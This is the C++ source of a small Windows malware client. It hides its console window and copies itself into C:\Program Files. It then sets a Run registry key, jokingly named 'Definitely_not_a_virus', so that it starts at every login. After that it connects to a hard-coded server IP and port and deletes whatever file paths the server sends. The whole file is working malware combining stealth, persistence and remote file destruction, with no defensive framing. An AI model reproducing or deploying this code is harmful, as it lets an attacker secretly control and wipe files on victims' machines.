#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define usePort 34353
#define SERVER_IP "192.168.100.4"

#include <iostream>
#include <WinSock2.h>
#include <Windows.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

/*
	todo
		> probably tmp isnt needed in COPYTOSYSTCATEG
*/

int WSASTARTUP(WORD wVersionRequired, LPWSADATA lpWSAData);
int Socket(int domain, int type, int protocol);
int WSAAPI Connect(SOCKET s, const sockaddr* name, int namelen);
int Recv(SOCKET s, char* buf, int len, int flags);
int Remove(const char* flName);
wchar_t * copyToSystCat();
void makeAutorun(wchar_t * flPath);

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	wchar_t * flPath = copyToSystCat();
	makeAutorun(flPath);

	WSAData wsadata;
	WORD DLLVersion = MAKEWORD(2, 2);
	WSASTARTUP(DLLVersion, &wsadata);

	sockaddr_in adr = { 0 };
	int sizeOfAdr = sizeof(adr);
	adr.sin_family = AF_INET;														// family of protocols
	adr.sin_port = htons(usePort);													//choosin port
	adr.sin_addr.s_addr = inet_addr(SERVER_IP);

	SOCKET clntConnect = Socket(AF_INET, SOCK_STREAM, NULL);
	unsigned short established_connection = 1;

	while (established_connection)
	{
		if (connect(clntConnect, (SOCKADDR*)&adr, sizeOfAdr) == 0)
		{
			cout << "connection is alive\n";
			established_connection = 0;
		}
		else
			cout << "awaiting for the connection\n";
		Sleep(100);
	}

	int res;
	while (1)
	{
		char flNameToDel[256];
		recv(clntConnect, flNameToDel, sizeof(flNameToDel), NULL);
		
		if (flNameToDel[0] == 'e' &&
			flNameToDel[1] == 'x' &&
			flNameToDel[2] == 'i' &&
			flNameToDel[3] == 't')
			break;
		res = remove(flNameToDel);
		char status[2] = { (char)(res + '0'), '\0' };
		send(clntConnect, status, sizeof(status), NULL);
	}

	closesocket(clntConnect);
	WSACleanup();
	return 0;
}

int WSASTARTUP(WORD wVersionRequired, LPWSADATA lpWSAData)
{
	int res = WSAStartup(wVersionRequired, lpWSAData);
	if (res != 0)
	{
		perror("Error with WINSOCK DLL");
		exit(EXIT_FAILURE);
	}
	return res;
}

int Socket(int domain, int type, int protocol)
{
	int res = socket(domain, type, protocol);
	// af inet - ipv4
	//tcp - sock_stream
	//udp - sock_dgram
	//0 - prtocol of lower lvl protocol
	if (res == -1)
	{
		perror("socket failed");
		exit(EXIT_FAILURE);
	}
	return res;
}

int WSAAPI Connect(SOCKET s, const sockaddr* name, int namelen)
{
	int WSAAPI res = connect(s, name, namelen);
	if (res != 0)
	{
		perror("Error : connection failure");
		exit(EXIT_FAILURE);
	}
	return res;
}

int Recv(SOCKET s, char* buf, int len, int flags)
{
	int res = recv(s, buf, len, flags);
	if (res == -1)
	{
		perror("problem with receivin client message\n");
		exit(EXIT_FAILURE);
	}
	return res;
}

int Remove(const char* flName)
{
	int res = remove(flName);
	if (res == -1)
	{
		perror("problem with deletin\n");
		exit(EXIT_FAILURE);
	}
	return res;
}

wchar_t * copyToSystCat()
{
	wchar_t * actExeFlPath = new wchar_t[256];
	wchar_t * finalPath = new wchar_t[256];

	GetModuleFileName(NULL, actExeFlPath, 256);
	wchar_t tmp[256];
	wcscpy(tmp, actExeFlPath);
	wchar_t * theFileName = _wcsrev(_wcstok(_wcsrev(tmp), L"\\"));
	//probably temp is not needed
	wcscpy(finalPath, L"C:\\Program Files\\");
	wcscat(finalPath, theFileName);

	if (CopyFile(actExeFlPath, finalPath, FALSE) == 0)
	{
		cout << "Error with copying file" << GetLastError() << endl;
		return actExeFlPath;
	} else
		return finalPath;
}

void makeAutorun(wchar_t * flPath)
{
	HKEY ADD;
	if (RegCreateKeyEx(HKEY_CURRENT_USER, 
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
		0, 
		NULL, 
		0, 
		KEY_ALL_ACCESS, 
		NULL, 
		&ADD,
		NULL) != ERROR_SUCCESS)
		cout << "Access to the regisrty denied" << endl;

	if (RegSetValueEx(ADD, 
		L"Definitely_not_a_virus", 
		0, 
		REG_SZ, 
		(const BYTE*)flPath, 
		256 * sizeof(wchar_t)) != 0)
		cout << "Access to change the registry denied" << endl;
	RegCloseKey(ADD);
}